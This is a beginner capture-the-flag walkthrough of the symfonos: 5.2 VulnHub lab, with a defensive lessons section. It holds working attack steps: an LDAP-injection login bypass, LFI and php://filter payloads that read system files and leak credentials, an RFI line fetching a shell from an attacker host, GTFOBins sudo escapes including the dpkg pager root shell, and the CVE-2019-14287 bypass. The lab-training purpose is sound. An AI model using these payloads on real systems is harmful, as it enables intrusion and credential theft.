# symfonos: 5.2 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | symfonos: 5.2 |
| **Difficulty** | **3 — Easy** (stated: *Intermediate*) |
| **Author** | Zayotic |
| **Released** | 2 March 2020 |
| **VulnHub Entry** | <https://vulnhub.com/entry/symfonos-52,415/> |
| **Download** | <https://vulnhub.com/entry/symfonos-52,415/#download> |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) |
| **Target OS** | Linux — Ubuntu (Apache 2.4.29, OpenSSH 7.9p1, OpenLDAP) |

> **Note:** VMware and VirtualBox builds can vary slightly ("varies by build"). The
> LDAP password, the `zeus` password and the internal container address may differ
> between rebuilds; the intended chain below is stable.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

- How to spot and exploit an **LDAP injection** in a login form — the difference
  between `*` (wildcard) and SQL.
- How to enumerate an **LDAP directory** with `ldapsearch` and understand its
  `base DN`, bind user and entries.
- What **Local File Inclusion (LFI)** is, and why the **PHP filter wrapper**
  (`php://filter/.../resource=...`) lets you read a `.php` file *as source*.
- How a leaked **LDAP bind password** lets you dump every entry, and why an LDAP
  password may be stored **Base64‑encoded** (not encrypted).
- How a single **`sudo` rule over `dpkg`** becomes a root shell via the **GTFOBins**
  technique.
- Why running a web app inside **Docker** changes what you see in `/etc/passwd`.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). Kali must be on the same host-only/NAT
network as the target.

---

## 1. Reconnaissance — finding the target

> **Goal:** find the target's IP on the lab network. It uses DHCP, so the IP may
> change on every import.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: Finished!   |   Screen View: Unique Hosts
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120
   ________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
   ________________________________________________________________________
   192.168.56.1    0a:00:27:00:00:00      1      60  Cadmus Computer Systems
   192.168.56.101  08:00:27:12:34:56      2     120  PCS Systemtechnik GmbH
```

> **How to read it:** `netdiscover` (or `arp-scan -l`) lists live hosts by watching
> ARP traffic. `192.168.56.101` is our target.

**Target IP:** `192.168.56.101`

![Finding the target](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

### 2.1 Port scan


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
```

```text
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
389/tcp open  ldap
636/tcp open  ldapssl
```

```bash
sudo nmap -sC -sV -p 22,80,389,636 -oA scans/services 192.168.56.101
```

```text
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
636/tcp open  ldapssl?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **How to read it:** four services. **LDAP (389/636)** is the giveaway — the web app
> almost certainly authenticates against a **directory server**. LDAP filters use the
> `*` wildcard, which is the seed of our login bypass.

![Nmap scan output](images/02-nmap.png)

### 2.2 LDAP — anonymous bind

```bash
ldapsearch -x -h 192.168.56.101 -D '' -w '' -b "DC=symfonos,DC=local"
```

```text
# extended LDIF
dn: dc=symfonos,dc=local
dc: symfonos
objectClass: top
objectClass: domain
...
result: 0 Success
```

> **Why it works:** an **anonymous bind** (empty user/password) is often allowed just
> to read the naming context. We learned the **base DN**: `dc=symfonos,dc=local`.
> The `DC=` parts stand for "Domain Component" — like a DNS name split on dots.

### 2.3 Web — brute-force directories

Browsing to `http://192.168.56.101/` shows a plain page with an image. Enumerate:


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)
> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)

```bash
ffuf -ic -c -u http://192.168.56.101/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -e /,.php,.html -t 50 | tee root.ffuf
```

```text
admin.php               [Status: 200, Size: 2000]
home.php                [Status: 302, Size: 0]
logout.php              [Status: 302, Size: 0]
```

> **Why it works:** `ffuf` replaces `FUZZ` for each wordlist entry. `admin.php`
> returns `200` (it is the login form); `home.php` returns `302` (it redirects you to
> the login until you are authenticated).

Visiting `http://192.168.56.101/home.php` redirects to `http://192.168.56.101/admin.php`,
which shows a **login form**.

![Directory enumeration](images/03-enum.png)

---

## 3. Foothold

### 3.1 LDAP injection — log in with `*`

Try SQL injection first if you like — it fails. This form authenticates against
**LDAP**. Log in with a wildcard:

```text
Username: *
Password: *
```

```text
302 Found -> Location: home.php
```

> **Why it works:** the code builds an LDAP filter like
> `(&(uid=$username)(userPassword=$password))`. Substituting `*` (the LDAP "match
> anything" wildcard) yields `(&(uid=*)(userPassword=*))`, which matches **every**
> entry — so the bind succeeds. This is **LDAP injection**.
> **Note:** confirm the behaviour — a randomly wrong password should *fail* while
> `*`/`*` succeeds, proving the wildcard is the trick.

### 3.2 Confirm the LFI on `home.php`

After logging in you land on `home.php`. The nav links use a `url=` parameter:

```text
http://192.168.56.101/home.php?url=http://127.0.0.1/portraits.php
```

Change `url` to a filesystem path:

```text
http://192.168.56.101/home.php?url=../../../../etc/passwd
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

> **Why it works:** the page does `file_get_contents($_GET['url'])` and echoes the
> result. `../` climbs out of the web root — classic **Local File Inclusion / path
> traversal**. Note the `passwd` file has **no normal user home directories** (later
> we will learn why — the app runs in Docker).

![Local File Inclusion](images/04-lfi.png)

### 3.3 Read the source code with a PHP filter

Requesting `admin.php` directly just **runs** it. To read it *as text*, use the PHP
filter wrapper and decode the Base64:


> ### 📖 Concept — What is Local File Inclusion?
>
> **LFI** happens when a script passes a user-controlled path to `include()`,
> `require()` or a file-read function without validating it:
>
> ```php
> <?php include($_GET['page']); ?>     // you control a filesystem path
> ```
>
> Now you can read anything the web-server user can read:
>
> ```text
> ?page=/etc/passwd
> ?page=../../../../etc/passwd
> ?page=/var/log/apache2/access.log        # log poisoning
> ?page=/proc/self/environ
> ?page=/var/lib/php/sessions/sess_<your PHPSESSID>
> ```
>
> **The wrapper to memorise is `php://filter`** — it returns the file **base64-encoded
> instead of executing it**, so you can read PHP *source*:
>
> ```text
> ?page=php://filter/convert.base64-encode/resource=index.php
> ```
>
> That is how you recover `wp-config.php`, `configuration.php`, `.env` and
> `config/database.php` — i.e. the database credentials.
>
> **LFI alone only reads.** To get code execution you must make the target *write* a
> file you control somewhere predictable, then include it. The usual primitives: an
> **NFS export**, session files, **log poisoning** (inject PHP through a crafted
> `User-Agent`, then include the access log), or `/proc/self/environ`.
>
> **RFI** (`?page=http://attacker/shell.txt`) is the remote version and requires
> `allow_url_include=1` in `php.ini` — off by default since PHP 5.2. When it fails the
> error usually says `http:// wrapper is disabled`, which tells you to switch to LFI
> plus a local write.
>
> **Deep dive:** [CONCEPTS §13.2 — LFI](../../docs/CONCEPTS.md#132-local-file-inclusion-lfi) ·
> [§13.3 — RFI](../../docs/CONCEPTS.md#133-remote-file-inclusion-rfi)

```text
http://192.168.56.101/home.php?url=php://filter/convert.base64-encode/resource=admin.php
```

```text
PD9waHAKc2Vzc2lvbl9zdGFydCgpOw...   (base64 — decode it)
```


> ### 📖 Concept — Encoding is not encryption
>
> These three get conflated constantly, and the confusion costs hours:
>
> | | **Encoding** | **Hashing** | **Encryption** |
> | --- | --- | --- | --- |
> | Purpose | Represent data in another *format* | Prove integrity / store passwords | Provide *confidentiality* |
> | Reversible? | **Yes — trivially, with no key** | **No** (only guessable) | Yes, **with the key** |
> | Key needed? | No | No | **Yes** |
> | Examples | base64, hex, URL-encoding, ROT13, binary | MD5, SHA-256, bcrypt, phpass | AES, RSA, ChaCha20 |
> | Security value | **Zero** | Depends on the algorithm | Depends on the key |
>
> **Recognise base64 on sight.** Three reliable tells: the character set is only
> `A–Z a–z 0–9 + /` with optional `=` padding; **the length is a multiple of 4**; and
> it is not a fixed-length digest with a `$1$`/`$6$`/`$P$` prefix.
>
> ```bash
> echo 'YWFydGk6YWFydGlAZ21haWwuY29t' | base64 -d; echo
> # aarti:aarti@gmail.com
> ```
>
> > **Base64 is not a secret.** It exists so binary data survives text-only transport
> > — email attachments, HTTP headers, JSON. Seeing it "protecting" a password is a
> > *finding*, not a defence. **Always check whether it is nested:** decode, then test
> > whether the result is itself base64 or hex. Some boxes chain two or three layers.
>
> **Identify hashes by prefix:** 32 hex = MD5 · 40 hex = SHA-1 · 64 hex = SHA-256 ·
> `$1$` = MD5-crypt · `$2b$` = bcrypt · `$6$` = SHA-512-crypt · `$y$` = yescrypt ·
> **`$P$`/`$H$` = phpass (WordPress, Drupal)** · `$apr1$` = Apache `.htpasswd` ·
> `pbkdf2_sha256$` = Django.
>
> **Deep dive:** [CONCEPTS §10 — Encoding vs hashing vs encryption](../../docs/CONCEPTS.md#10-encoding-vs-hashing-vs-encryption)

```bash
echo 'PD9waHAKc2Vzc2lvbl9zdGFydCgpOw...' | base64 -d
```

```php
<?php
function authLdap($username, $password) {
  $ldap_ch = ldap_connect("ldap://172.18.0.22");
  ldap_set_option($ldap_ch, LDAP_OPT_PROTOCOL_VERSION, 3);
  $bind = ldap_bind($ldap_ch, "cn=admin,dc=symfonos,dc=local", "qMDdyZh3cT6eeAWD");
  ...
  $filter = "(&(uid=$username)(userPassword=$password))";
  $result = ldap_search($ldap_ch, "dc=symfonos,dc=local", $filter);
  ...
}
```

> **Why it works:** the `php://filter/convert.base64-encode/resource=...` wrapper
> returns the file's bytes Base64‑encoded instead of executing it. Reading the source
> reveals the **hard-coded LDAP bind password**:
> `cn=admin,dc=symfonos,dc=local` / `qMDdyZh3cT6eeAWD`. It also confirms the injectable
> filter from §3.1.

### 3.4 Dump LDAP with the leaked bind password

```bash
ldapsearch -x -h 192.168.56.101 \
  -D "cn=admin,dc=symfonos,dc=local" -w 'qMDdyZh3cT6eeAWD' \
  -b "dc=symfonos,dc=local"
```

```text
dn: uid=zeus,dc=symfonos,dc=local
uid: zeus
userPassword: Y2V0a0tmNHdDdUhDOUZFVA==

dn: uid=admin,dc=symfonos,dc=local
uid: admin
```

> **Why it works:** with a valid bind we can search the whole directory. The
> `userPassword` value ends in `==` — that is Base64. **LDAP stores it encoded, not
> encrypted**, so decode it:

```bash
echo 'Y2V0a0tmNHdDdUhDOUZFVA==' | base64 -d; echo
```

```text
cetkKf4wCuHC9FET
```

> **Why it matters:** we now have credentials for the Linux user `zeus`
> (`zeus:cetkKf4wCuHC9FET`). **Note:** the exact values vary by build.

### 3.5 SSH in as `zeus`

```bash
ssh zeus@192.168.56.101
# password: cetkKf4wCuHC9FET
id
```

```text
uid=1000(zeus) gid=1000(zeus) groups=1000(zeus),...(sudo)
```

Upgrade to a full TTY:


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then:  stty raw -echo; fg   and:  export TERM=xterm
```

### 3.6 The user flag

```bash
cat /home/zeus/user.txt
```

```text
(symfonos user flag)
```

![Shell as zeus](images/05-foothold.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

### 4.1 Check sudo rights


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```bash
sudo -l
```

```text
User zeus may run the following commands on symfonos:
    (root) NOPASSWD: /usr/bin/dpkg
```

> **Why it works:** `zeus` may run **`dpkg` as root with no password**. `dpkg` is a
> package manager, but it can spawn a shell — so this permission is effectively a root
> shell. This is the classic **GTFOBins** pattern: a legitimate tool that can break out
> of its intended job.

### 4.2 Abuse `dpkg`

`dpkg -l` opens an interactive pager; type `!` to run a shell command, which starts a
shell **as root**:

```bash
sudo dpkg -l
```

```text
Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name           Version       Architecture Description
+++-==============-=============-============-=================================
ii  acl            2.2.53-4      amd64        access control list - utilities
...
```

At the `:` prompt:

```text
!/bin/sh
# whoami
root
```

> **Why it works:** `dpkg -l` pipes its output through a pager, and the default pager
> lets you execute a shell with `!`. Because we invoked `dpkg` **through sudo**, that
> shell inherits **root**. This is documented verbatim on
> [GTFOBins → dpkg](https://gtfobins.github.io/gtfobins/dpkg/).

### 4.3 The root flag

```bash
cd /root
cat proof.txt
```

```text
Congrats on rooting symfonos:5.2!
(symfonos root proof)
```

![Privilege escalation to root](images/06-privesc.png)

### 4.4 Why "no users in /etc/passwd"?

Looking closer post-exploitation, the web stack runs inside **Docker containers**. That
is why the LDAP bind target (`172.18.0.22`) is a container IP and why the earlier
`/etc/passwd` looked bare. The host and the containers are **separate namespaces** —
a good reminder to ask "which machine am I actually on?".

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Anonymous LDAP bind / directory disclosure | `ldap://192.168.56.101:389` | Reveals base DN `dc=symfonos,dc=local` |
| 2 | **LDAP injection** in login filter | `admin.php` (`uid=*`) | Authentication bypass |
| 3 | Local File Inclusion / path traversal | `home.php?url=...` | Arbitrary file read |
| 4 | Hard-coded LDAP bind password in source | `admin.php` | Full LDAP read access |
| 5 | Weak LDAP password storage (Base64, reversible) | `userPassword` attribute | Recovers `zeus`'s password |
| 6 | Over-permissive `sudo` rule | `(root) NOPASSWD: /usr/bin/dpkg` | Root shell via GTFOBins |
| 7 | Unauthenticated `php://filter` source disclosure | `home.php?url=php://filter/...` | Reads any readable file as source |

## 6. Defensive lessons (blue team)

- **Escape LDAP filter input.** Use proper LDAP escaping (RFC 4515) so `*`, `(` and `)`
  cannot be injected. Better still, use a library that builds filters safely.
- **Disable anonymous binds** unless a service truly needs it, and rate-limit binds.
- **Never concatenate user input into file paths.** `file_get_contents` on a
  user-supplied path is LFI; validate against an allow-list and block `../` and
  wrappers such as `php://`.
- **Do not hard-code secrets in source.** The bind password leaked the whole directory.
  Store secrets in a vault and rotate them.
- **Do not treat "encoded" as "safe".** Base64 is reversible; store password hashes
  with a modern KDF (Argon2/bcrypt) and never base64 an actual secret.
- **Apply the principle of least privilege to `sudo`.** A package manager as root = a
  root shell. Maintain an explicit allow-list and review it against GTFOBins.
- **Segment and label containers.** Understand that a container is a different trust
  boundary; don't assume file contents map to the host.
- **Detection ideas:** alert on LDAP queries containing `*)(` or `*`, on `../` and
  `php://filter` in URLs, on `sudo dpkg` usage outside change windows, and on
  interactive shells spawned from a package-manager pager.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: <https://vulnhub.com/entry/symfonos-52,415/>
- Community writeups consulted:
  - [Vulnhub: Symfonos 5 — ikuamike](https://blog.ikuamike.io/posts/2021/symfonos5/)
  - [Symfonos 5.2: CTF walkthrough — Infosec Institute](https://www.infosecinstitute.com/resources/capture-the-flag/symfonos-5-2-ctf-walkthrough/)
  - [SYMFONOS: 5.2 Walkthrough — news4hackers](https://www.news4hackers.com/symfonos-5-2-vuln-hub-machine-walkthrough/)
- Vendor advisories / docs:
  - [GTFOBins — dpkg](https://gtfobins.github.io/gtfobins/dpkg/)
  - [HackTricks — LDAP Injection](https://book.hacktricks.xyz/pentesting-web/ldap-injection)
  - [OWASP — LDAP Injection](https://owasp.org/www-community/attacks/LDAP_Injection)
  - [HackTricks — File Inclusion / LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
  - [RFC 4515 — LDAP Search Filters](https://datatracker.ietf.org/doc/html/rfc4515)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target (`ip a` / `netdiscover`)
- [ ] `images/02-nmap.png` — port/service scan (22, 80, 389, 636)
- [ ] `images/03-enum.png` — `/admin.php` and `/home.php` discovery
- [ ] `images/04-lfi.png` — LFI via `home.php?url=` (reading `/etc/passwd`)
- [ ] `images/05-foothold.png` — LDAP dump + SSH as `zeus`
- [ ] `images/06-privesc.png` — `sudo dpkg` → `!/bin/sh` → root
- [ ] `images/07-root-flag.png` — `/root/proof.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
